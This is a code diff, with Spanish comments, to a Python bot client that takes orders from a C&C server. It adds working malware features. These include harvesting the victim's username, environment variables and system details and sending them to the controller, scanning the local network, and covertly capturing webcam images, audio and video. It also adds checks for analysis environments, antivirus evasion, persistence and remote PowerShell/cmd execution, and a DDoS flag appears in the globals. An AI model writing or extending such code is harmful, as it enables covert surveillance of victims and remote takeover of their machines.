@@ -1,9 +1,11 @@
+from datetime import datetime
 import socket
 import subprocess
 import platform
 import os
 import ipaddress
 import uuid
+import psutil
 import requests
 import argparse
 import re
@@ -16,14 +18,7 @@ import hashlib
 import json
 
 # Importar los módulos con las funcionalidades
-from modules.basic_commands import (
-    execute_system_command,
-    get_system_info,
-    capture_screenshot,
-    list_processes,
-    kill_process,
-    list_network_connections
-)
+from modules.command_exec import CommandExecutor
 from modules.file_operations import (
     list_directory,
     upload_file,
@@ -31,11 +26,9 @@ from modules.file_operations import (
     delete_file,
     create_directory
 )
-from modules.advanced_execution import (
-    execute_powershell,
-    execute_background_payload
-)
-
+from modules.network_operations import NetworkAnalyzer
+from modules.av_control import AudioVideoCapture
+from modules.av_evasion import AVEvasion
 
 # Variables globales
 ddos_running = False
@@ -45,6 +38,12 @@ parser.add_argument("--host", required=True, help="IP del servidor C&C")
 parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
 parser.add_argument("--key", required=True, help="Clave de autenticación")
 args = parser.parse_args()
+
+# Inicializar módulos globalmente
+command_executor = CommandExecutor()
+network_analyzer = NetworkAnalyzer()
+av_capture = AudioVideoCapture()
+av_evasion = AVEvasion()
 
 # Configurar logging
 def configurar_logging():
@@ -258,18 +257,63 @@ def verificar_eula(tipo):
         exit()
 
 def detectar_sistema():
-    
-    """
-    Detecta el sistema operativo del bot.
-
-    Usa la función platform.system() para determinar el sistema operativo
-    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
-    """
+    """Detecta el sistema operativo y recopila información extendida del sistema."""
     try:
-        return platform.system().lower()  # "windows" o "linux"
+        sistema = platform.system().lower()
+        
+        # Obtener el nombre de usuario actual
+        try:
+            import getpass
+            username = getpass.getuser()
+        except:
+            username = "unknown"
+
+        # Obtener tiempo de actividad del sistema
+        try:
+            if sistema == "windows":
+                import ctypes
+                kernel32 = ctypes.windll.kernel32
+                uptime_seconds = kernel32.GetTickCount64() // 1000  # En segundos
+                uptime = str(datetime.timedelta(seconds=uptime_seconds))
+            else:
+                with open('/proc/uptime', 'r') as f:
+                    uptime_seconds = int(float(f.readline().split()[0]))
+                    uptime = str(datetime.timedelta(seconds=uptime_seconds))
+        except:
+            uptime = "Desconocido"
+
+        # Obtener variables de entorno relevantes
+        env_vars = {
+            "PATH": os.getenv("PATH", "No disponible"),
+            "TEMP": os.getenv("TEMP", "No disponible"),
+            "USERNAME": os.getenv("USERNAME", "No disponible"),
+            "COMPUTERNAME": os.getenv("COMPUTERNAME", "No disponible"),
+            "NUMBER_OF_PROCESSORS": os.getenv("NUMBER_OF_PROCESSORS", "No disponible")
+        }
+
+        # Recopilar información del sistema
+        info = {
+            "os": sistema,
+            "hostname": socket.gethostname(),
+            "version": platform.version(),
+            "machine": platform.machine(),
+            "processor": platform.processor(),
+            "architecture": platform.architecture()[0],
+            "python_version": sys.version.split()[0],
+            "username": username,
+            "current_dir": os.getcwd(),
+            "uptime": uptime,
+            "env_vars": str(env_vars),
+            "total_memory": f"{psutil.virtual_memory().total // (1024**3)} GB",
+            "cpu_cores": psutil.cpu_count(),
+            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        logging.debug(f"Información del sistema recopilada: {info}")
+        return info
     except Exception as e:
         logging.error(f"Error al detectar el sistema operativo: {e}")
-        return "desconocido"
+        return {"os": "desconocido", "hostname": "unknown"}
 
 def conectar_a_CnC():
     try:
@@ -384,24 +428,30 @@ def esperar_ordenes(bot):
                 continue
             
             logging.info(f"Comando recibido: {orden}")
-            resultado = None
-
-            # Procesamiento de comandos
+            
             try:
-                if orden == "shutdown":
+                if orden == "detect_os":
+                    sistema_info = detectar_sistema()
+                    # Asegurarse de que el JSON es válido antes de enviarlo
+                    json_data = json.dumps(sistema_info)
+                    bot.send(json_data.encode("utf-8"))
+                    continue
+
+                elif orden == "shutdown":
                     logging.info("Recibida orden de apagado")
                     bot.close()
                     break
 
                 elif orden == "detect_os":
-                    bot.send(detectar_sistema().encode("utf-8"))
+                    sistema_info = detectar_sistema()
+                    bot.send(json.dumps(sistema_info).encode("utf-8"))
                     continue
 
                 elif orden == "sysinfo":
-                    resultado = get_system_info()
+                    resultado = command_executor.get_system_info()
 
                 elif orden == "screenshot":
-                    resultado = capture_screenshot()
+                    resultado = command_executor.capture_screenshot()
                     if resultado['success']:
                         resultado = f"data:image/png;base64,{resultado['image']}"
                     else:
@@ -429,17 +479,50 @@ def esperar_ordenes(bot):
                         resultado = {"success": False, "error": "Formato de script inválido"}
 
                 elif orden == "procesos":
-                    resultado = list_processes()
+                    resultado = command_executor.list_processes()
 
                 elif orden.startswith("kill:"):
                     pid = int(orden[5:])
-                    resultado = kill_process(pid)
+                    resultado = command_executor.kill_process(pid)
 
                 elif orden == "netstat":
-                    resultado = list_network_connections()
+                    resultado = command_executor.list_network_connections()
 
                 elif orden == "persistencia":
                     resultado = intentar_persistencia()
+
+                # Añadir nuevos comandos para network_operations
+                elif orden == "network_scan":
+                    resultado = network_analyzer.scan_local_network()
+                elif orden == "network_interfaces":
+                    resultado = network_analyzer.get_network_interfaces()
+                elif orden == "network_stats":
+                    resultado = network_analyzer.get_network_statistics()
+                elif orden.startswith("analyze_dns:"):
+                    domain = orden.split(":")[1]
+                    resultado = network_analyzer.analyze_dns(domain)
+
+                # Añadir comandos para av_control
+                elif orden == "webcam":
+                    resultado = av_capture.capture_webcam_image()
+                elif orden.startswith("audio_record:"):
+                    duracion = int(orden.split(":")[1])
+                    resultado = av_capture.start_audio_recording(duracion)
+                elif orden == "stop_audio":
+                    resultado = av_capture.stop_audio_recording()
+                elif orden.startswith("video_record:"):
+                    duracion = int(orden.split(":")[1])
+                    resultado = av_capture.start_video_recording(duracion)
+                elif orden == "stop_video":
+                    resultado = av_capture.stop_video_recording()
+                elif orden == "av_devices":
+                    resultado = av_capture.get_device_info()
+
+                # Añadir comandos para av_evasion
+                elif orden == "check_analysis":
+                    resultado = av_evasion.check_environment()
+                elif orden == "apply_evasion":
+                    resultado = av_evasion.apply_evasion_techniques()
 
                 else:
                     resultado = {"success": False, "error": f"Comando no reconocido: {orden}"}
@@ -466,6 +549,12 @@ def esperar_ordenes(bot):
             logging.error(f"Error en la comunicación con el servidor: {traceback.format_exc()}")
             break
 
+    # Limpiar recursos al cerrar
+    try:
+        av_capture.cleanup()
+    except:
+        pass
+
     logging.info("Cliente cerrado correctamente")
     sys.exit(0)
 
@@ -485,16 +574,20 @@ def procesar_operacion_archivo(operacion, ruta, file_data=None):
 
 def ejecutar_script(tipo, contenido):
     """Ejecuta diferentes tipos de scripts."""
-    tipos_script = {
-        "powershell": execute_powershell,
-        "cmd": lambda x: execute_system_command(x, shell=True),
-        "python": lambda x: exec(x),
-        "background": lambda x: execute_background_payload(x)
-    }
-    
-    if tipo in tipos_script:
-        return tipos_script[tipo](contenido)
+    if tipo == "powershell":
+        return command_executor.execute_powershell(contenido)
+    elif tipo == "cmd":
+        return command_executor.execute_cmd(contenido)
+    elif tipo == "script":
+        return command_executor.execute_script(contenido)
     return {"success": False, "error": f"Tipo de script no soportado: {tipo}"}
+
+def execute_system_command(comando, shell=True):
+    """Ejecuta un comando del sistema."""
+    if shell:
+        return command_executor.execute_cmd(comando)
+    else:
+        return command_executor.execute_powershell(comando)
 
 def ejecutar_comando(orden):
     """
